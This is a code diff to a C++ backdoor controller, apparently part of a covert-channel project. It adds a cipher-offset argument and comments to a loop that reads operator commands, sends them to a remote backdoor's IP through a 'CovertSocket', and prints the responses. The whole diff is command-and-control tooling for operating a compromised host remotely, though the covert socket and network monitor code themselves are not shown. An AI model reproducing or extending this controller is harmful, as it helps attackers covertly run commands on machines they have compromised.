@@ -1,3 +1,9 @@
+/**
+ * This is the controller for controlling the backdoor
+ *
+ * Author: Sean H
+ */
+
 #include <iostream>
 #include <string.h>
 #include <pthread.h>
@@ -13,6 +19,7 @@ int controlBackdoorLoop(CovertSocket, NetworkMonitor*);
 
 std::string backdoorIP;
 std::string bindIP;
+int cypherOffset;
 
 int main(int argc, char* argv[])
 {
@@ -32,8 +39,8 @@ int main(int argc, char* argv[])
         }
     }
 
-    CovertSocket covertSocket(backdoorIP, bindIP);
-    NetworkMonitor * networkMonitor = NetworkMonitor::getInstance();
+    CovertSocket covertSocket(backdoorIP, bindIP, cypherOffset);
+    NetworkMonitor * networkMonitor = NetworkMonitor::getInstance(cypherOffset);
     networkMonitor->getInterface();
     controlBackdoorLoop(covertSocket, networkMonitor);
 
@@ -53,7 +60,7 @@ int setArgs(int argc, char* argv[])
         return 2;
     }
 
-    if(argc < 3 or argc > 5) //This checks if the valid amount of args are passed in (valid arg numbers: 1 extra)
+    if(argc < 3 or argc > 6) //This checks if the valid amount of args are passed in (valid arg numbers: 1 extra)
     {
         Logger::error("Invalid number or args inputted");
         return 1;
@@ -62,13 +69,25 @@ int setArgs(int argc, char* argv[])
 
     backdoorIP = argv[1]; //Set the first arg as the server IP
     bindIP = argv[2];
-    if(argc == 4 && strcmp(argv[3], "debug") == 0)
+
+    if(argc > 3)
+    {
+        cypherOffset = stoi(argv[3]);
+    }
+    else
+    {
+        cypherOffset = 0;
+    }
+    if(argc == 5 && strcmp(argv[4], "debug") == 0)
     {
         Logger::setDebug(true);
     }
     return 0;
 }
 
+/**
+ * This loop will send a command to the backdoor then wait for the reply.
+ */
 int controlBackdoorLoop(CovertSocket covertSocket, NetworkMonitor * networkMonitor )
 {
     bool running = true;
@@ -79,11 +98,11 @@ int controlBackdoorLoop(CovertSocket covertSocket, NetworkMonitor * networkMonit
     while(running)
     {
         std::cout << ">";
-        std::cin.getline(commandBuffer, sizeof(commandBuffer));
+        std::cin.getline(commandBuffer, sizeof(commandBuffer)); //Get command form stdin
         command  = commandBuffer;
 
-        covertSocket.sendCommand(command);
-        response = networkMonitor->getResponse();
+        covertSocket.sendCommand(command); //Send command
+        response = networkMonitor->getResponse(); //Await reply
         std::cout << std::endl << response << std::endl;
     }
 }
